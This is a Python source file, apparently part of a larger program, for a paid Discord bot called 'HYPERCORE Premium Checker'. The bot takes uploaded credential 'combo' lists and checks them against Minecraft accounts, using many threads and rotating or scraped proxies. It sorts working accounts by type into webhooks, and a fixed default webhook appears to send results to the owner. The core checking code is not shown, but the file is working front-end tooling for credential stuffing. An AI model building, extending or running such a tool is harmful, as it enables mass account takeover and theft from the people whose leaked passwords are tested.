@bot.event
async def on_ready():
    global synced_commands
    print(f'🤖 HYPERCORE Bot | {bot.user} has logged in!')
    
    hypercore_branding = CONFIG.get('hypercore_branding', {})
    status_message = hypercore_branding.get('status_message', 'HYPERCORE Checking System')
    embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
    
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{status_message} | ⚡ HYPERCORE ⚡"
        )
    )
    
    # Sync slash commands only once
    if not synced_commands:
        try:
            synced = await bot.tree.sync()
            synced_commands = True
            print(f"✅ Synced {len(synced)} slash command(s)")
            print("⚡ HYPERCORE Premium Checker is ready! ⚡")
        except Exception as e:
            print(f"❌ Failed to sync slash commands: {e}")

# ==================== AUTH COMMANDS ====================

@bot.tree.command(name="auth", description="Add or remove user authorization")
@app_commands.describe(
    user="The user to authorize/deauthorize",
    duration="Duration: 1d, 1m (leave empty to remove)"
)
async def auth_command(interaction: discord.Interaction, user: discord.Member, duration: str = None):
    """Add user with duration or remove user"""
    
    # Only owner can use auth command
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="❌ Owner Only",
            description="Only the bot owner can use this command.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    # If no duration provided, remove user
    if duration is None:
        if auth.remove_user(user.id):
            embed = discord.Embed(
                title="✅ User Removed",
                description=f"Removed authorization for {user.mention}",
                color=discord.Color.green()
            )
            await interaction.followup.send(embed=embed)
            
            # DM the user
            try:
                await user.send("❌ Your HYPERCORE access has been removed.")
            except:
                pass
        else:
            await interaction.followup.send(f"❌ {user.mention} is not authorized")
        return
    
    # Add user with duration
    expiry, error = auth.add_user(user.id, duration)
    
    if error:
        embed = discord.Embed(
            title="❌ Invalid Duration",
            description="Use: `1d`, `1m`",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed)
        return
    
    # Format duration for display
    duration_display = {
        '1d': '1 Day',
        '1m': '1 Month',
    }.get(duration.lower(), duration)
    
    embed = discord.Embed(
        title="✅ User Authorized",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    embed.add_field(name="User", value=user.mention, inline=True)
    embed.add_field(name="Duration", value=duration_display, inline=True)
    embed.add_field(name="Expires", value=f"<t:{int(expiry)}:F>", inline=True)
    embed.set_footer(text=f"ID: {user.id}")
    
    await interaction.followup.send(embed=embed)
    
    # DM the user
    try:
        await user.send(f"✅ You now have HYPERCORE access for **{duration_display}**!")
    except:
        pass

@bot.tree.command(name="authlist", description="List all authorized users")
async def authlist_command(interaction: discord.Interaction):
    """List all authorized users"""
    
    # Only owner can view list
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="❌ Owner Only",
            description="Only the bot owner can view authorized users.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    users = auth.list_users()
    
    if not users:
        await interaction.followup.send("📝 No authorized users")
        return
    
    embed = discord.Embed(
        title="📋 Authorized Users",
        color=discord.Color.purple()
    )
    
    for user_id, expiry in users[:10]:  # Show first 10
        try:
            user_obj = await bot.fetch_user(int(user_id))
            name = user_obj.name
        except:
            name = f"Unknown ({user_id})"
        
        embed.add_field(
            name=name,
            value=f"Expires: <t:{int(expiry)}:R>",
            inline=True
        )
    
    if len(users) > 10:
        embed.set_footer(text=f"Showing 10 of {len(users)} users")
    
    await interaction.followup.send(embed=embed)

# ==================== CHECK COMMAND ====================

@bot.tree.command(name="check", description="Start checking Minecraft accounts with HYPERCORE")
@app_commands.describe(
    threads="Number of threads to use (1-100)",
    proxy_type="Type of proxy: 1(Http), 2(Socks4), 3(Socks5), 4(None/Proxyless), 5(Auto Scraper)",
    delay="Delay between checks in seconds (e.g., 0.5 for half a second)"
)
async def check_command(interaction: discord.Interaction, threads: int, proxy_type: int, delay: float = 0.0):
    """Start a new HYPERCORE checker session"""
    
    # Check authorization
    authorized, _ = auth.is_authorized(interaction.user.id)
    if not authorized:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description="You need to be authorized to use this command.\nContact the bot owner to purchase access.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    # Validate threads
    if threads < 1 or threads > 100:
        await interaction.followup.send("❌ Threads must be between 1 and 100")
        return
    
    # Validate proxy type
    proxy_map = {
        1: "'1'",
        2: "'2'", 
        3: "'3'",
        4: "'4'",
        5: "'5'"
    }
    
    if proxy_type not in proxy_map:
        await interaction.followup.send("❌ Invalid proxy type. Use: 1 (HTTP), 2 (SOCKS4), 3 (SOCKS5), 4 (None), 5 (Auto Scraper)")
        return
    
    mapped_proxy_type = proxy_map[proxy_type]
    
    # Check if user already has active session
    user_sessions = [s for s in active_checkers.values() if s.interaction.user.id == interaction.user.id and s.is_running]
    if user_sessions:
        await interaction.followup.send("❌ You already have an active HYPERCORE checker session. Use `/stop` to stop it first.")
        return
    
    # Send initial setup message
    hypercore_branding = CONFIG.get('hypercore_branding', {})
    embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
    
    embed = discord.Embed(
        title="🔧 HYPERCORE Checker Setup",
        description="Please upload your files to start checking (Multiple files or ZIP files supported)",
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=embed_thumbnail)
    embed.add_field(name="Threads", value=str(threads), inline=True)
    embed.add_field(name="Proxy Type", value=str(proxy_type), inline=True)
    embed.add_field(name="Delay", value=f"{delay}s", inline=True)
    embed.set_footer(text="HYPERCORE Premium Checker", icon_url=embed_thumbnail)
    
    await interaction.followup.send(embed=embed)
    await interaction.followup.send("📁 **Please upload your combos file(s) now** (text files or a ZIP file):")
    
    def check_attachment(message):
        return (message.author == interaction.user and 
                message.channel == interaction.channel and 
                message.attachments)
    
    try:
        attachment_msg = await bot.wait_for('message', check=check_attachment, timeout=60.0)
        combos_paths = []
        
        for attachment in attachment_msg.attachments:
            if attachment.filename.endswith(('.txt', '.zip')):
                content = await attachment.read()
                path = f"temp_hypercore_combos_{interaction.id}_{attachment.filename}"
                with open(path, 'wb') as f:
                    f.write(content)
                combos_paths.append(path)
        
        if not combos_paths:
            await interaction.followup.send("❌ No valid .txt or .zip files provided.")
            return
        
        # Delete the upload message for cleanliness
        try:
            await attachment_msg.delete()
        except:
            pass
            
        await interaction.followup.send(f"✅ **Files loaded**: {len(combos_paths)} files")
        
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ File upload timed out. Please try the command again.")
        return
    except Exception as e:
        await interaction.followup.send(f"❌ Error reading combos file: {str(e)}")
        return
    
    proxies_path = None
    # Ask for proxies file if proxy type requires it
    if proxy_type != 4 and proxy_type != 5:
        await interaction.followup.send("🌐 **Optional**: Upload your proxies file or type `skip` to continue without proxies:")
        
        def check_proxy_attachment_or_skip(message):
            return (message.author == interaction.user and 
                    message.channel == interaction.channel and 
                    ((message.attachments and message.attachments[0].filename.endswith('.txt')) or
                     message.content.lower().strip() in ['skip', 'no', 'none']))
        
        try:
            proxy_msg = await bot.wait_for('message', check=check_proxy_attachment_or_skip, timeout=30.0)
            
            if proxy_msg.attachments:
                proxies_attachment = proxy_msg.attachments[0]
                
                # Download the proxies file
                proxies_content = await proxies_attachment.read()
                proxies_path = f"temp_hypercore_proxies_{interaction.id}.txt"
                
                with open(proxies_path, 'wb') as f:
                    f.write(proxies_content)
                
                # Verify proxies file has content
                with open(proxies_path, 'r', encoding='utf-8') as f:
                    proxy_lines = f.readlines()
                    if len(proxy_lines) == 0:
                        await interaction.followup.send("⚠️ The provided proxies file is empty. Continuing without proxies.")
                        proxies_path = None
                    else:
                        await interaction.followup.send(f"✅ **Proxies loaded**: {len(proxy_lines)} proxies")
                
                # Delete the upload message for cleanliness
                try:
                    await proxy_msg.delete()
                except:
                    pass
                    
            else:
                await interaction.followup.send("ℹ️ Continuing without proxies.")
                
        except asyncio.TimeoutError:
            await interaction.followup.send("ℹ️ Proxies upload timed out. Continuing without proxies.")
    
    # Create checker session with default webhook
    session = CheckerSession(interaction, threads, mapped_proxy_type, combos_paths, proxies_path, CONFIG['webhook'], delay)
    active_checkers[session.session_id] = session
    
    # Start checker in background
    asyncio.create_task(session.run_checker())

# ==================== STOP COMMAND ====================

@bot.tree.command(name="stop", description="Stop your HYPERCORE checking sessions")
async def stop_command(interaction: discord.Interaction):
    """Stop HYPERCORE checking sessions"""
    
    # Check authorization
    authorized, _ = auth.is_authorized(interaction.user.id)
    if not authorized:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description="You need to be authorized to use this command.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()

    # Stop all user's sessions
    user_sessions = [
        s for s in active_checkers.values()
        if s.interaction.user.id == interaction.user.id and s.is_running
    ]

    if not user_sessions:
        await interaction.followup.send("❌ You don't have any active HYPERCORE checker sessions.")
        return

    for session in user_sessions:
        session.is_running = False

    await interaction.followup.send(f"🛑 Stopped **{len(user_sessions)}** HYPERCORE checker session(s).")

# ==================== STATUS COMMAND ====================

@bot.tree.command(name="status", description="Check your HYPERCORE session status")
async def status_command(interaction: discord.Interaction):
    """Check status of running HYPERCORE sessions"""
    
    # Check authorization
    authorized, _ = auth.is_authorized(interaction.user.id)
    if not authorized:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description="You need to be authorized to use this command.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    # All user sessions
    user_sessions = [s for s in active_checkers.values() 
                    if s.interaction.user.id == interaction.user.id and s.is_running]
    
    if not user_sessions:
        await interaction.followup.send("❌ You don't have any active HYPERCORE checker sessions.")
        return
    
    for session in user_sessions:
        await session.send_status_update()

# ==================== LIST COMMAND ====================

@bot.tree.command(name="list", description="List all active HYPERCORE sessions")
async def list_command(interaction: discord.Interaction):
    """List all active HYPERCORE sessions"""
    
    # Check authorization
    authorized, _ = auth.is_authorized(interaction.user.id)
    if not authorized:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description="You need to be authorized to use this command.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    active_sessions = [s for s in active_checkers.values() if s.is_running]
    
    if not active_sessions:
        await interaction.followup.send("❌ No active HYPERCORE checker sessions.")
        return
    
    hypercore_branding = CONFIG.get('hypercore_branding', {})
    embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
    
    embed = discord.Embed(
        title="📋 All Active HYPERCORE Sessions",
        color=discord.Color.purple()
    )
    
    embed.set_thumbnail(url=embed_thumbnail)
    
    for session in active_sessions[:10]:  # Limit to 10
        user = session.interaction.user
        progress = f"{session.stats['checked']:,}/{session.stats['total']:,} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
        embed.add_field(
            name=f"{user.name} - {session.session_id[:8]}",
            value=f"Progress: {progress}\nHits: {session.stats['hits']:,}\nThreads: {session.threads}",
            inline=True
        )
    
    if len(active_sessions) > 10:
        embed.set_footer(text=f"Showing 10 of {len(active_sessions)} sessions")
    
    await interaction.followup.send(embed=embed)

# ==================== WEBHOOK COMMAND ====================

@bot.tree.command(name="webhook", description="Configure webhooks for different account types")
@app_commands.describe(
    type="Type: banned, unbanned, xbox, ultimate, other, results",
    url="Webhook URL or 'none' to clear"
)
async def webhook_command(interaction: discord.Interaction, type: str, url: str):
    """Configure webhooks for different account types"""
    
    # Check authorization
    authorized, _ = auth.is_authorized(interaction.user.id)
    if not authorized:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description="You need to be authorized to use this command.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    valid_types = ['banned', 'unbanned', 'xbox', 'ultimate', 'other', 'results']
    if type.lower() not in valid_types:
        await interaction.followup.send(f"❌ Type must be: {', '.join(valid_types)}")
        return
    
    key_map = {
        'banned': 'BannedWebhook',
        'unbanned': 'UnbannedWebhook',
        'xbox': 'XboxWebhook',
        'ultimate': 'XboxUltimateWebhook',
        'other': 'OtherWebhook',
        'results': 'ResultsWebhook'
    }
    
    key = key_map[type.lower()]
    
    if url.lower() == 'none':
        CONFIG[key] = ""
        await interaction.followup.send(f"✅ Cleared {type} webhook")
    elif url.startswith('http'):
        CONFIG[key] = url
        await interaction.followup.send(f"✅ Updated {type} webhook")
    else:
        await interaction.followup.send("❌ Invalid URL")

# ==================== CONFIG COMMAND ====================

@bot.tree.command(name="config", description="View HYPERCORE configuration")
async def config_command(interaction: discord.Interaction):
    """View HYPERCORE configuration"""
    
    # Only owner can view config
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="❌ Owner Only",
            description="Only the bot owner can view configuration.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    hypercore_branding = CONFIG.get('hypercore_branding', {})
    embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
    
    embed = discord.Embed(
        title="⚙️ HYPERCORE Configuration",
        color=discord.Color.purple()
    )
    
    embed.set_thumbnail(url=embed_thumbnail)
    
    # Show main settings
    main_settings = {
        "Max Retries": CONFIG.get('max_retries', 5),
        "Hypixel Ban Check": CONFIG.get('hypixelban', True),
        "Embed Mode": CONFIG.get('embed', True),
        "Auto Scrape Minutes": CONFIG.get('auto_scrape_minutes', 5),
        "Bot Name": CONFIG.get('bot_name', 'HYPERCORE'),
        "Send Files External": CONFIG.get('send_files_external', True),
    }
    
    for name, value in main_settings.items():
        embed.add_field(name=name, value=str(value), inline=True)
    
    # Show webhook status
    webhooks = {
        "Main Webhook": "✅ Fixed",
        "Banned Webhook": "✅" if CONFIG.get('BannedWebhook') else "❌",
        "Unbanned Webhook": "✅" if CONFIG.get('UnbannedWebhook') else "❌",
        "Xbox Webhook": "✅" if CONFIG.get('XboxWebhook') else "❌",
        "Xbox Ultimate": "✅" if CONFIG.get('XboxUltimateWebhook') else "❌",
        "Other Webhook": "✅" if CONFIG.get('OtherWebhook') else "❌",
        "Results Webhook": "✅" if CONFIG.get('ResultsWebhook') else "❌",
    }
    
    webhook_text = "\n".join([f"{k}: {v}" for k, v in webhooks.items()])
    embed.add_field(name="Webhooks", value=webhook_text, inline=False)
    
    embed.set_footer(text="HYPERCORE Premium Checker", icon_url=embed_thumbnail)
    await interaction.followup.send(embed=embed)

# ==================== HELP COMMAND ====================

@bot.tree.command(name="help", description="Show HYPERCORE help menu")
async def help_command(interaction: discord.Interaction):
    """Show help menu"""
    
    await interaction.response.defer()
    
    hypercore_branding = CONFIG.get('hypercore_branding', {})
    embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
    
    embed = discord.Embed(
        title="⚡ HYPERCORE Help Menu ⚡",
        description="Premium Minecraft Account Checker",
        color=discord.Color.purple()
    )
    
    embed.set_thumbnail(url=embed_thumbnail)
    
    # Auth Commands
    auth_commands = (
        "`/auth @user 1d` - Add user for 1 day\n"
        "`/auth @user 1m` - Add user for 1 month\n"
        "`/auth @user` - Remove user\n"
        "`/authlist` - List all authorized users"
    )
    embed.add_field(name="🔐 Auth Commands", value=auth_commands, inline=False)
    
    # Checker Commands
    checker_commands = (
        "`/check <threads> <proxy> [delay]` - Start checking\n"
        "`/stop` - Stop your sessions\n"
        "`/status` - Check session status\n"
        "`/list` - List all active sessions"
    )
    embed.add_field(name="✅ Checker Commands", value=checker_commands, inline=False)
    
    # Webhook Commands
    webhook_commands = (
        "`/webhook <type> <url>` - Set webhook\n"
        "`/webhook <type> none` - Clear webhook\n"
        "Types: banned, unbanned, xbox, ultimate, other, results"
    )
    embed.add_field(name="🌐 Webhook Commands", value=webhook_commands, inline=False)
    
    # Other Commands
    other_commands = (
        "`/config` - View configuration (owner only)\n"
        "`/help` - Show this menu"
    )
    embed.add_field(name="📋 Other Commands", value=other_commands, inline=False)
    
    embed.set_footer(text="HYPERCORE Premium Checker v3.0", icon_url=embed_thumbnail)
    
    await interaction.followup.send(embed=embed)

# ==================== RUN BOT ====================

if __name__ == "__main__":
    token = CONFIG['token']
    if token == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set your bot token in CONFIG")
        print("Edit the CONFIG dictionary at the top of the file")
        sys.exit(1)
    
    print("=" * 60)
    print("⚡ Starting HYPERCORE Premium Checker v3.0 ⚡")
    print("=" * 60)
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🔑 Default Webhook: Configured")
    print("=" * 60)
    print("✅ Available Commands:")
    print("  /auth @user 1d     - Add user for 1 day")
    print("  /auth @user 1m     - Add user for 1 month")
    print("  /auth @user        - Remove user")
    print("  /authlist          - List all users")
    print("  /check             - Start checking")
    print("  /stop              - Stop sessions")
    print("  /status            - Check status")
    print("  /list              - List all sessions")
    print("  /webhook           - Configure webhooks")
    print("  /config            - View config")
    print("  /help              - Show help")
    print("=" * 60)
    
    bot.run(token)
